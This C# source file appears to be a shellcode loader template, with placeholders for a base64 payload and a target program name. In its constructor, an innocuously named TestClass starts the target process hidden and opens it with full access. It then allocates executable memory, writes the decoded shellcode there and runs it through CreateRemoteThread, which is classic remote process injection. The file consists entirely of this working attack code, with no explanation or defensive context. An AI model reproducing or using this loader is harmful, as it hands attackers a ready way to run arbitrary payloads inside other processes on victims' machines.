using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;

   public class TestClass
        {
            
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
            [DllImport("kernel32.dll")]
            static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


            public TestClass()
            {
                

		        //Add the shellcode
                string b64 = "%%PAYLOAD%%";

                byte[] shellcode = new byte[] { };
                shellcode = Convert.FromBase64String(b64);

                //Process target = Process.Start("%%TARGETPS%%");
                Process target = new Process();
                target.StartInfo = new ProcessStartInfo("%%TARGETPS%%");
                target.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                target.Start();

                var target_pid = target.Id;
                IntPtr hProcess = OpenProcess(0x001F0FFF, false, target_pid); //PROCESS_ALL_ACCESS (0x001F0FFF) //dwProcessId == 4804 //bInheritHandle for child process

                //Console.WriteLine("DEBUG:: VirtualAllocEx");
                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x10000, 0x3000, 0x40); //PAGE_EXECUTE_READWRITE (0x40) //IntPtr.Zero == null, auto //MEM_COMMIT and MEM_RESERVE (0x3000)
                //Console.ReadLine();
                //byte[] buf = new byte[591]
                
                IntPtr outSize;
                //Console.WriteLine("DEBUG:: WriteProcessMemory");
                WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);
                //Console.ReadLine();
                //Console.WriteLine("DEBUG:: CreateRemoteThread");
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
